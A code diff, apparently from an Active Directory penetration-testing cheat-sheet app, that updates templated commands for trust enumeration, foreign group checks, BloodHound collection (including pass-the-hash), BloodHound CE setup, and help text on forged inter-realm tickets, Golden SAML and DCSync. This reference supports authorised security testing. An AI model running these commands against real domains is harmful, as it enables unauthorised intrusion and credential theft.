  [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,trustDirection,trustAttributes,trustType`,'raw trust attributes'],
  [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
- [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M enum_trusts`,'nxc module (version dependent)']
-],note:'<span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. Child DCs also hold the machine-readable trust key.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts)']
+],note:'<span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. Child DCs also hold the machine-readable trust key.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});
 
 R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
 cmds:[
@@ -2600,8 +2601,8 @@ R({id:'trust-foreign-groups',cat:'trust',title:'Foreign group membership',desc:'
 cmds:[
  [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=ForeignSecurityPrincipals,{{domain_dn}}' '(objectClass=foreignSecurityPrincipal)' cn,objectSid`,'foreign SIDs present in this domain'],
  [`impacket-lookupsid '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}'`,'resolve SIDs against the trusted DC'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{user}}'`,'your own (possibly foreign) group memberships'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --attr member`,'inspect a group for foreign SIDs'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{user}}'`,'your own (possibly foreign) group memberships'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --attr member`,'inspect a group for foreign SIDs'],
  [`nxc smb {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>'`,'use credentials from the owning domain against this one'],
  [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>' --groups`,'enumerate as the foreign user']
 ],note:'Two directions: (1) foreign principals nested in <b>your</b> groups are an entry path for credentials from their home domain; (2) your user nested in a foreign group grants you access there. BloodHound shows both via the "Foreign group members (cross-domain)" query in the BloodHound tab. Memberships only translate into access where the resource domain accepts the authenticating user.'});
@@ -2621,8 +2622,9 @@ cmds:[
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --bloodhound -c All --dns-server {{dc_ip}}`,'password'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --bloodhound -c All --dns-server {{dc_ip}}`,'PtH'],
  [`KRB5CCNAME={{ccache}} nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --bloodhound -c All --dns-server {{dc_ip}}`,'ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path loot.zip`,'bloodyAD collector']
-],note:'Output zip lands in the current directory. Collection methods: <span class="mono">All</span>, <span class="mono">Group</span>, <span class="mono">Session</span>, <span class="mono">Trusts</span>, <span class="mono">ACL</span>, <span class="mono">ObjectProps</span>, <span class="mono">DCOnly</span>.'});
+ [`mkdir -p bloodhound`,'create the output directory first — bloodyad aborts if --path does not exist','n'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path bloodhound`,'collect into ./bloodhound (import via CE UI or: bhcli upload bloodhound/*.zip)']
+],note:'The bloodyAD collector writes the zip into <span class="mono">./bloodhound</span> (the directory must exist — hence the mkdir line); import it via the CE UI (File Ingest) or <span class="mono">bhcli upload bloodhound/*.zip</span>. nxc collection methods: <span class="mono">All</span>, <span class="mono">Group</span>, <span class="mono">Session</span>, <span class="mono">Trusts</span>, <span class="mono">ACL</span>, <span class="mono">ObjectProps</span>, <span class="mono">DCOnly</span>.'});
 
 /* @@RECIPES@@ */
 /* ===== WIZARD FLOWS ===== */
@@ -2761,15 +2763,25 @@ steps:[
  {t:'Extract the rest',d:'Offline ntds parsing, DSRM local admin and DNSAdmins plugin abuse for persistence.',r:['creds-ntds-offline','dsrm','dnsadmins']}
 ]}
 );
-R({id:'bhcli-setup',cat:'bh',title:'bhcli — setup & data ingest',desc:'Unofficial CLI for the BloodHound CE API: authenticate once, then query, mark and audit from the terminal.',
+R({id:'bhcli-setup',cat:'bh',title:'BloodHound CE setup + bhcli',desc:'Minimal Docker-based BloodHound CE install, then the terminal workflow: authenticate, ingest, mark and query.',
 cmds:[
- [`git clone https://github.com/exploide/bhcli.git && cd bhcli && pipx install .`,'install (pipx handles the venv)','n'],
+ [`sudo apt update && sudo apt install -y docker.io docker-compose-v2`,'Docker for CE (Desktop or Podman with Docker compat also work)','ns'],
+ [`sudo usermod -aG docker $USER`,'run docker without sudo (re-login afterwards)','n'],
+ [`wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz`,'official BloodHound CLI (installer/manager)','n'],
+ [`tar -xvzf bloodhound-cli-linux-amd64.tar.gz && sudo mv bloodhound-cli /usr/local/bin/`,'unpack and put it on PATH','n'],
+ [`bloodhound-cli install`,'pull images, write docker-compose.yml, print the admin password','n'],
+ [`bloodhound-cli running`,'are the containers up?','n'],
+ [`bloodhound-cli logs`,'troubleshoot (exit code 137 = out of memory)','n'],
+ [`bloodhound-cli resetpwd`,'lost the generated admin password?','n'],
+ [`bloodhound-cli down && bloodhound-cli up`,'stop/start (e.g. to free RAM)','n'],
+ [`bloodhound-cli update`,'update CE','n'],
+ [`git clone https://github.com/exploide/bhcli.git && cd bhcli && pipx install .`,'bhcli (CLI for the CE API)','n'],
  [`bhcli auth http://localhost:8080`,'store an API token (prompts for user/password)'],
  [`bhcli status api-version`,'verify the connection'],
  [`bhcli upload *.zip`,'ingest collector output'],
  [`bhcli domains --sid`,'list known domains and SIDs'],
  [`bhcli mark Owned --file valid-users.txt`,'mark accounts as Owned']
-],note:'Talks to the BloodHound CE REST API, so it works regardless of the graph backend (PostgreSQL by default, Neo4j optional). The token is stored in <span class="mono">~/.config/bhcli/bhcli.ini</span>. Tab completion for bash/zsh/fish ships with the Click framework. Do not confuse it with SpecterOps <span class="mono">bloodhound-cli</span>, which only installs and manages the server.'});
+],note:'Order: start CE → log in at <span class="mono">http://localhost:8080/ui/login</span> (user <span class="mono">admin</span> plus the password printed by install) → <span class="mono">bhcli auth</span> → ingest (CE UI <b>File Ingest</b> or <span class="mono">bhcli upload</span>). Requirements: Docker (Desktop, docker.io + compose v2, or Podman in Docker compatibility mode) and <b>≥8 GB RAM</b> — low memory makes the bloodhound container exit with code 137. CE binds to 127.0.0.1 by default. bhcli talks to the CE REST API, so the backend (PostgreSQL default, Neo4j optional) does not matter. Not the same as SpecterOps bloodhound-cli, which installs and manages the server.'});
 
 R({id:'bhcli-recon',cat:'bh',title:'bhcli — lists, stats & audit',desc:'Terminal answers instead of GUI clicking: users/computers/groups, nested memberships, stats and a quick audit.',
 cmds:[
@@ -2855,7 +2867,8 @@ const HELP_TOOL = {
  'impacket-petitpotam': 'Coerces machine accounts via EFSRPC to authenticate to your listener.',
  'impacket-dfscoerce': 'Authentication coercion via DFS-RPC — a spooler-free alternative.',
  'certipy': 'AD CS swiss army knife: find vulnerable templates (ESC1-17), request and authenticate certificates, shadow credentials, CA backup and forge.',
- 'bloodyAD': 'LDAP-first AD privesc tool: read and write objects and rights (genericAll, dcsync, rbcd, shadowCredentials, SPNs, passwords).',
+ 'bloodyad': 'LDAP-first AD privesc tool: read and write objects and rights (genericAll, dcsync, rbcd, shadowCredentials, SPNs, passwords). On Kali the binary is bloodyad; pipx installs both names.',
+ 'bloodyAD': 'Alternative spelling of the bloodyad binary (both entry points are installed).',
  'nxc': 'NetExec (formerly CrackMapExec): multi-protocol AD operations — auth checks, enumeration, dumping (sam/lsa/ntds/dpapi), modules and command exec.',
  'kerbrute': 'Kerberos brute-force toolkit: userenum via pre-auth error codes (no lockout) and password spraying.',
  'coercer': 'Fires every known authentication-coercion vector at a target and points it to a listener.',
@@ -2886,7 +2899,8 @@ const HELP_TOOL = {
  'ADFSpoof.py': 'Forges SAML tokens (Golden SAML) from ADFSDump output for o365 or generic saml2 relying parties.',
  'roadrecon': 'ROADtools client for Entra ID: authenticate, gather tenant objects/apps/roles (gather) and browse them (gui).',
  'bloodhound-ce-python': 'BloodHound CE collector — same data as bloodhound-python, newer package name.',
- 'bhcli': 'Unofficial CLI client for the BloodHound CE API — query, upload, mark Owned, audit and import custom queries from the terminal.'
+ 'bhcli': 'Unofficial CLI client for the BloodHound CE API — query, upload, mark Owned, audit and import custom queries from the terminal.',
+ 'bloodhound-cli': 'Official BloodHound CLI (SpecterOps): installs, updates and manages the CE containers via Docker Compose or Podman.'
 };
 const HELP_ATTACK = {
  'trust-raisechild': 'Child domains store a trust key for their parent. With DA in the child you can forge an inter-realm TGT carrying the parent Enterprise Admins SID and authenticate to the parent DC as Administrator — escalation across the trust.',
@@ -2978,8 +2992,9 @@ function applyHelp(){
 }
 function helpCoverage(){
   const used = {};
+  const aliases = ['bloodyAD'];
   RECIPES.forEach(r => r.cmds.forEach(c => { const k = toolKey(Array.isArray(c) ? c[0] : c); if(k) used[k] = (used[k] || 0) + 1; }));
-  return { used, unused: Object.keys(HELP_TOOL).filter(k => !used[k]) };
+  return { used, unused: Object.keys(HELP_TOOL).filter(k => !used[k] && aliases.indexOf(k) < 0) };
 }
 applyHelp();
 
@@ -3022,9 +3037,10 @@ function zshToolData(){
       }
     });
     if(key === 'certipy' && second) d.subs.add(second);
-    if(key === 'bloodyAD'){ const m = t.match(/\b(add|get|set|remove|msldap)\b/); if(m) d.subs.add(m[1]); }
+    if(key === 'bloodyad' || key === 'bloodyAD'){ const m = t.match(/\b(add|get|set|remove|msldap)\b/); if(m) d.subs.add(m[1]); }
     if(key === 'nxc' && second && /^[a-z]+$/.test(second)) d.subs.add(second);
-    if(key === 'bhcli' && second && /^[a-z-]+$/.test(second)) d.subs.add(second);
+    if(key === 'bhcli' && second && /^[a-z][a-z-]*$/.test(second)) d.subs.add(second);
+    if(key === 'bloodhound-cli' && second && /^[a-z][a-z-]*$/.test(second)) d.subs.add(second);
     const mm = t.match(/-M\s+([A-Za-z0-9_]+)/); if(mm) d.modules.add(mm[1]);
     const hm = t.match(/-m\s+(\d+)/); if(hm) d.modes.add(hm[1]);
   }));
@@ -3032,12 +3048,15 @@ function zshToolData(){
 }
 function zshEmit(data){
   const names = Object.keys(data).sort((a, b) => a.toLowerCase() < b.toLowerCase() ? -1 : 1);
+  const aliases = {};
+  if(names.indexOf('bloodyad') >= 0 && names.indexOf('bloodyAD') < 0) aliases.bloodyAD = 'bloodyad';
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
-  let out = '#compdef ' + names.join(' ') + '\n';
-  out += '# Hackerman v1.9.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
+  out += '# Hackerman v1.10.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
+  Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
   out += '  esac\n}\n\n';
   names.forEach(n => {
     const d = data[n];
@@ -3129,7 +3148,7 @@ const REQS = {
   'trust-enum':['creds'], 'trust-raisechild':['da'], 'trust-cross-domain-roast':['trustedcreds'],
   'trust-sid-history':['trustkey','da'], 'trust-foreign-groups':['creds'],
   'bh-python':['creds'], 'bh-nxc':['creds'],
-  'bhcli-setup':['bh'], 'bhcli-recon':['bh'], 'bhcli-cypher':['bh'], 'bhcli-alternatives':['bh']
+  'bhcli-setup':['shell','bh'], 'bhcli-recon':['bh'], 'bhcli-cypher':['bh'], 'bhcli-alternatives':['bh']
 };
 const REQ_ISSUES = [];
 function reqSorted(reqs){ return (reqs || []).slice().sort((a, b) => (REQ_DEFS[b] ? REQ_DEFS[b].sev : 0) - (REQ_DEFS[a] ? REQ_DEFS[a].sev : 0)); }
